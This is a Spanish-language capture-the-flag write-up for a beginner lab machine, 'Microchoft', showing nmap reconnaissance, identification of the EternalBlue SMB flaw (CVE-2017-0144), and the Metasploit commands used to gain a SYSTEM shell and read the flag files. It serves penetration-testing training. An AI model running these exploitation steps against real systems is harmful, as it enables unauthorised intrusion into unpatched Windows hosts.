
# The Hackers Labs Writeup — Microchoft
<img width="1376" height="768" alt="image_2dffb87" src="https://github.com/user-attachments/assets/cab475fd-25c9-4f9f-af36-5693665651b3" />




A continuación, se describe la guía de resolución de la máquina de **The Hackers Labs** denominada *"Microchoft"*.

Esta máquina está catalogada con la dificultad **"Principiante"** y sus autores son **condor** y **CuriosidadesDeHackers**.

---

## ⚠️ ATENCIÓN

Las herramientas y técnicas utilizadas en la resolución de este laboratorio han sido ejecutadas en un entorno controlado. El autor de esta publicación no se hace responsable del mal uso que se haga de estas, ya que el objetivo final de esta publicación es transmitir conocimientos con fines éticos y educativos.

---

## 🔍 Reconocimiento inicial

Se inicia el reconocimiento mediante un `ping` a la máquina para detectar su accesibilidad y el sistema operativo mediante el **TTL** asignado.

```bash
ping -c 1 192.168.48
```

Se comprueba que el **TTL es 128**, lo que indica:
- La máquina es accesible directamente.
- El sistema subyacente es **Microsoft Windows**.

---

## 🛠️ Escaneo de puertos y servicios

### 1. Escaneo de todos los puertos TCP (SYN)
```bash
sudo nmap -sS -p- --min-rate 1000 -n -Pn 192.168.48 -oN allPorts
```

### 2. Reconocimiento de servicios en puertos abiertos
```bash
nmap -sCV -p 135,139,445,49152,49153,49154,49155,49156,49157 -n -Pn 192.168.150.133 -oN services
```

> **Nota:** Se omite el escaneo UDP, ya que no hay servicios relevantes para este ejercicio.

---

## 🚪 Acceso inicial (NT Authority\SYSTEM)

Se detectan los siguientes puertos abiertos (excluyendo high ports):

- **Puerto 135**: Servicio RPC (Microsoft Windows RPC).
- **Puerto 139**: Protocolo NetBIOS (Microsoft Windows SMB).
- **Puerto 445**: Protocolo SMB (Microsoft Windows SMB).

Gracias al reconocimiento, se identifica el sistema como:
**Windows 7 Home Basic 7601 Service Pack 1**.

---

## 🛡️ Análisis de vulnerabilidades

Tras investigar los servicios sin autenticación, no se encontró nada relevante. Por ello, se analiza manualmente la versión del sistema.

### 🔴 Vulnerabilidad detectada: **CVE-2017-0144 (EternalBlue)**
- **Descripción:** Ejecución remota de código en **SMBv1**.
- **Impacto:** Un atacante remoto puede enviar paquetes maliciosos al puerto **445/TCP** y obtener control total sin autenticación.

### 📌 Referencias:
- [CVE-2017-0144 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [Módulo de Metasploit (EternalBlue)](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

---

## 💻 Explotación con Metasploit

Se configura y ejecuta el exploit **EternalBlue** para obtener una sesión **Meterpreter** como **NT Authority\SYSTEM**.

```bash
msfconsole
msf> search eternalblue
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS 192.168.48
msf> options
msf> run
```

Tras la explotación, se verifica la sesión:

```bash
meterpreter> sysinfo
meterpreter> getuid
```

---

## 🎯 Obtención de flags

### 🔹 Flag del usuario **Lola**
```bash
meterpreter> shell
C:\> dir C:\Users
C:\> dir C:\Users\Lola\Desktop
C:\> type C:\Users\Lola\Desktop\user.txt
```

### 🔹 Flag del usuario **Admin**
```bash
C:\> dir C:\Users\Admin\Desktop
C:\> type C:\Users\Admin\Desktop\admin.txt.txt
```
```
